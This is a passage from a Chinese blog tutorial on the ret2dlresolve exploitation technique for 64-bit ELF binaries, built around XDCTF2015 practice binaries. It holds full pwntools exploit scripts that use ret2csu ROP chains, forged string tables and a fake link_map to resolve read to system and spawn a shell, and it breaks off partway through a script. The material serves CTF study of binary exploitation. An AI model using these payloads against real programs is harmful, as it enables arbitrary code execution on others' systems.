RELRO</strong>情况下是可写的。那么利用思路就很明确了，可以直接rop链调用read读取内容覆盖<strong>DT_STRTAB</strong>为一个我们可控的地址，然后我们自己在该地址处伪造一个字符表，把目标函数的字符串换成system，最后直接返回到该函数plt表第二个jmp前的push处压id调用**_dl_runtime_resolve**即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601231749750.png"
                      class=""
                >
<p>解析完就可以直接执行system函数了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602003537787.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_no_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400773</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400771</span></span><br><span class="line">ret = <span class="number">0x00000000004004c6</span></span><br><span class="line">read_got = <span class="number">0x600B18</span></span><br><span class="line">gadget1 = <span class="number">0x40076A</span></span><br><span class="line">gadget2 = <span class="number">0x400750</span></span><br><span class="line">strtab = <span class="number">0x600990</span></span><br><span class="line">main = <span class="number">0x40063E</span></span><br><span class="line">data = <span class="number">0x600c00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, strtab, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(p64(data))		<span class="comment"># 更改DT_STRTAB</span></span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">0x60</span>, return_after_call=main))</span><br><span class="line">p.send(dynstr)		<span class="comment"># 伪造字符表</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data+<span class="number">0x100</span>, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)			<span class="comment"># 读入字符串</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data+<span class="number">0x100</span>) + p64(<span class="number">0x400516</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)		<span class="comment"># 将read函数解析成system从而获取shell</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h4 id="partial-relro-64">PARTIAL RELRO-64</h4>
<h5 id="法一">法一</h5>
<p>由于在<strong>PARTIAL
RELRO</strong>下dynamic节不可直接改写，所以要借助其它方式来利用。首先我们重温一下<strong>dl_fixup</strong>的流程，以write调用为例，一开始我们可以发现可以定位到<strong>ELF
JMPREL Relocation
Table</strong>的起始位置<strong>0x400488</strong>，然后通过rdx的偏移定位到对应的<strong>Elf64_Rela</strong>表项，这里的rdx是用rsi定位出来的，而rsi正是我们plt表中第一个push的序号。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133740717.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133943320.png"
                      class=""
                >
<p>其中ELF64_Rela结构体定义如下，其中sym的偏移在<strong>r_info</strong>的高4字节处，那么可以看出write的sym偏移为1，read的sym偏移为4：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602135216930.png"
                      class=""
                >
<p>在 64 位下，Elf64_Sym 结构体为,其中Elf64_Word 32 位，Elf64_Section 16
位，Elf64_Addr 64 位，Elf64_Xword 64 位</p>
<p>所以，Elf64_Sym 的大小为 0x18 个字节。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
<p>由于got表还是可写的，而且程序解析函数前push进去的<strong>link_map</strong>地址也在got表上（前面的0x601008位置就是存<strong>link_map</strong>的地址，10处存**_dl_runtime_resolve<strong>函数指针）。那么我们可以直接覆盖掉这个link_map指针，并指向自己伪造一个</strong>link_map**，从而可以实现攻击目的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602164008783.png"
                      class=""
                >
<p>需要伪造的<strong>link_map</strong>结构体比较复杂，这里可以尝试结合动态调试把用到的字段填充。比如一开始这里获取symtab，根据正常运行时的结果，我们伪造<strong>link_map</strong>的偏移0x68处是一个地址A，A+0x8处存着字符表指针，那我们可以把这个位置指向我们可控的地址，其偏移8处为我们伪造的字符表；而偏移0xf8处可以直接填入<strong>0x3fe5e0</strong>（可见之前的图，理论上也可以自己伪造），复用程序的<strong>ELF
JMPREL Relocation Table</strong>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602165804130.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x68</span>: (data+<span class="number">0x200</span>),</span><br><span class="line">    <span class="number">0xf8</span>: <span class="number">0x3fe5e0</span>,</span><br><span class="line">    <span class="number">0x208</span>: (data+<span class="number">0x210</span>),</span><br><span class="line">    <span class="number">0x210</span>: dynstr</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
<p>首先用上述<strong>fake_link_map</strong>后，我们再往后执行看看，然后需要往偏移0x70处填入0x3fe570，复用正常的<strong>link_map</strong>的值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172122538.png"
                      class=""
                >
<p>然后版本字段也需要对照正常的情况在偏移<strong>0x1c8</strong>处填入<strong>0x3fe640</strong>，但这里比较麻烦的是，正常执行过程中后面的<strong>0x2e0</strong>偏移处存的是一个libc上的地址，这个是我们不能预测的。我们只能尝试控制该地址后，在该地址+6*8偏移处手动填入<strong>0x3fe47b</strong>，并且在再高8位地址处手动填入hash码。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172850333.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602173807678.png"
                      class=""
                >
<p>之后来到<strong>lookup_symbols</strong>的调用，发现第四个参数也就是<strong>l-&gt;l_scope</strong>又是一个我们无法控制的值，其由<code>mov rcx, qword ptr [r10 + 0x380]</code>得到，但这个位置的值又是一个libc上的地址，我们不能预测。那么实际上这条路就被封死了，我们只能另寻他法。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602174905079.png"
                      class=""
                >
<p>有了上面的基础，其实如果我们可以用write或其它输出函数泄露出原来<strong>link_map</strong>的值，那我们就可以不用自己伪造其它字段，只用更改一开始的<strong>strtab</strong>的引用即可，也就是更改0x68偏移处的内容即可。但很显然，如果可以泄露地址的话不如直接获取libc基址然后打ret2libc，更加简洁方便，我们这里其实可以用别的方法来在没有地址泄露的情况下打通。</p>
<p>其实我们仔细看源码，就会发现前面的执行都是进了下面这个分支中找libc计算地址的，但实际程序还可以进入else分支进行计算。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">    result = l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>那我们可以构造参数从而使最后<code>byte ptr [rsi + 5]</code>处为3，这里对于read函数来说，后面靠着sym表（也就是0xf8处）得到的idx为4，那么<strong>0x7f81ca42efbb</strong>处算出的rsi就为0xc，之后只要控制<code>lea rsi, [rax + rsi*8]</code>中的rax就可以完成对rsi的控制。而且这里<code>add rbx,rax</code>得到的rbx得是got表地址，也就是说此时的rax必须为0，因为前面已经把got地址赋给了rbx。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7f81ca42ef86 &lt;_dl_fixup+6&gt;     lea    rdx, [rsi + rsi*2]             </span><br><span class="line">0x7f81ca42ef8a &lt;_dl_fixup+10&gt;    sub    rsp, 0x10                       </span><br><span class="line">0x7f81ca42ef8e &lt;_dl_fixup+14&gt;    mov    rax, qword ptr [rdi + 0x68]     </span><br><span class="line">0x7f81ca42ef92 &lt;_dl_fixup+18&gt;    mov    rdi, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42ef96 &lt;_dl_fixup+22&gt;    mov    rax, qword ptr [r10 + 0xf8]     </span><br><span class="line">0x7f81ca42ef9d &lt;_dl_fixup+29&gt;    mov    rax, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42efa1 &lt;_dl_fixup+33&gt;    lea    r8, [rax + rdx*8]              </span><br><span class="line">0x7f81ca42efa5 &lt;_dl_fixup+37&gt;    mov    rax, qword ptr [r10 + 0x70]     </span><br><span class="line">0x7f81ca42efa9 &lt;_dl_fixup+41&gt;    mov    rcx, qword ptr [r8 + 8]         </span><br><span class="line">0x7f81ca42efad &lt;_dl_fixup+45&gt;    mov    rbx, qword ptr [r8]             </span><br><span class="line">0x7f81ca42efb0 &lt;_dl_fixup+48&gt;    mov    rax, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42efb4 &lt;_dl_fixup+52&gt;    mov    rdx, rcx                        </span><br><span class="line">0x7f81ca42efb7 &lt;_dl_fixup+55&gt;    shr    rdx, 0x20</span><br><span class="line">0x7f81ca42efbb &lt;_dl_fixup+59&gt;    lea    rsi, [rdx + rdx*2]              </span><br><span class="line">0x7f81ca42efbf &lt;_dl_fixup+63&gt;    lea    rsi, [rax + rsi*8]           </span><br><span class="line">0x7f81ca42efc3 &lt;_dl_fixup+67&gt;    mov    rax, qword ptr [r10]         </span><br><span class="line">0x7f81ca42efc6 &lt;_dl_fixup+70&gt;    mov    qword ptr [rsp + 8], rsi     </span><br><span class="line">0x7f81ca42efcb &lt;_dl_fixup+75&gt;    add    rbx, rax                     </span><br><span class="line">0x7f81ca42efce &lt;_dl_fixup+78&gt;    cmp    ecx, 7                       </span><br><span class="line">0x7f81ca42efd1 &lt;_dl_fixup+81&gt;    jne    _dl_fixup+372               &lt;_dl_fixup+372&gt;</span><br><span class="line">0x7f81ca42efd7 &lt;_dl_fixup+87&gt;    test   byte ptr [rsi + 5], 3     </span><br><span class="line">0x7f81ca42efdb &lt;_dl_fixup+91&gt;    jne    _dl_fixup+248               &lt;_dl_fixup+248&gt;</span><br></pre></td></tr></table></figure></div>
<p>构造的<strong>fake_link_map</strong>如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data为fake_link_map读取到的地址</span></span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,</span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),</span><br><span class="line">    <span class="number">0xf8</span>: <span class="number">0x3fe5e0</span>,</span><br><span class="line">    <span class="number">0x158</span>: (data+<span class="number">0x200</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x205</span>: <span class="number">3</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
<p>然后进入目标分支，此时<code>add rax, qword ptr [rsi + 8]</code>得到的结果最后会写回到got表中，但前面我们已经把rax改成0了，这里我们能够实现写<strong>system</strong>函数的地址到<strong>read_got</strong>，需要让<strong>rsi</strong>指向某个已经解析过的函数的got表地址-8，而且<strong>rsi+5</strong>处的值得为3，这里刚好可以发现第五个字节一般是0x7f，可以通过<code>test byte ptr [rsi + 5], 3</code>的条件。然后rax存一个相对偏移，从而可以在rax里得到<strong>system</strong>函数的地址。但我们如果把rax变成偏移，那么前面生成rbx的逻辑就得不到对应得got表地址了。不过其实这个函数解析完后，最后会直接跳转到此时解析出得函数指针处执行，如果能确保此时得rbx为一个可写的地址，也可以实现利用。所以我们还得调整rbx的值。那么实际这个偏移0xf8处的<strong>symtab</strong>也得我们自己构造。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602193718943.png"
                      class=""
                >
<p>用的<strong>fake_link_map</strong>如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data为fake_link_map读取到的地址</span></span><br><span class="line">offset = libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: offset,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,         <span class="comment"># strtab</span></span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),     <span class="comment"># Relocation Table</span></span><br><span class="line">    <span class="number">0xf8</span>: (data+<span class="number">0x300</span>),     <span class="comment"># symtab</span></span><br><span class="line">    <span class="number">0x158</span>: (read_got-<span class="number">8</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x308</span>: (data+<span class="number">0x320</span>-<span class="number">9</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x320</span>: (read_got-offset),</span><br><span class="line">    <span class="number">0x328</span>: (<span class="number">0x400000007</span>),</span><br><span class="line">    <span class="number">0x350</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后就可以把system函数地址写到<strong>read_got</strong>中，只要我们事先把rdi指向/bin/sh，然后再返回到<strong>read</strong>所对应的plt表项的第二个jump前的push。然后就可以getshell了。每个程序的函数表的布局不一样，所以根据题目的不同改0x68，0x158，0x308，0x328处的值即可。如果想要更紧凑的<strong>fake_link_map</strong>可以自行更改偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602202230030.png"
                      class=""
                >
<p>最终exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004007a1</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">read_got = <span class="number">0x601030</span></span><br><span class="line">gadget1 = <span class="number">0x40079A</span></span><br><span class="line">gadget2 = <span class="number">0x400780</span></span><br><span class="line">link_map = <span class="number">0x601008</span></span><br><span class="line">main = <span class="number">0x40066E</span></span><br><span class="line">data = <span class="number">0x601500</span></span><br><span class="line"><span class="comment"># strtab = 0x3fe438</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, link_map, <span class="number">0x8</span>, return_after_call=main))</span><br><span class="line">p.send(p64(data))</span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.info(offset)</span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: offset,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,         <span class="comment"># strtab</span></span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),     <span class="comment"># Relocation Table</span></span><br><span class="line">    <span class="number">0xf8</span>: (data+<span class="number">0x300</span>),     <span class="comment"># symtab</span></span><br><span class="line">    <span class="number">0x158</span>: (read_got-<span class="number">8</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x308</span>: (data+<span class="number">0x320</span>-<span class="number">9</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x320</span>: (read_got-offset),</span><br><span class="line">    <span class="number">0x328</span>: (<span class="number">0x400000007</span>),</span><br><span class="line">    <span class="number">0x350</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">0x400</span>, return_after_call=main))</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data+<span class="number">0x350</span>) + p64(<span class="number">0x400546</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h5 id="法二">法二</h5>
<p>但我之后发现有字符表位于<strong>0x3fe438</strong>处好像是直接可写的，而且其地址也是固定的，那么就可以试试直接覆盖不在程序段的字符表。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141756764.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141818968.png"
                      class=""
                >
<p>可惜的是最后有如下报错，那我们跟进去<strong>dl_fixup</strong>看看是具体哪里出了问题。报错说是e不是一个<strong>symbol
system version</strong>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602143248861.png"
                      class=""
                >
<p>发现是我们前面直接把read字符串换成system字符串写入后，后面用到的版本信息错位了。那么我们前面就需要确保后续信息的对齐，可以破坏掉一些已经解析过的libc函数的字符串缩减字符，由于不会再用到该字符串，所以无伤大雅。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145152644.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145718453.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145205542.png"
                      class=""
                >
<p>将版本信息对齐后，就可以正常把system函数地址解析进入<strong>read
got</strong>了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602145921752.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004007a1</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">read_got = <span class="number">0x601030</span></span><br><span class="line">gadget1 = <span class="number">0x40079A</span></span><br><span class="line">gadget2 = <span class="number">0x400780</span></span><br><span class="line"><span class="comment"># strtab = 0x600990</span></span><br><span class="line">main = <span class="number">0x40066E</span></span><br><span class="line">data = <span class="number">0x601500</span></span><br><span class="line">strtab = <span class="number">0x3fe438</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># 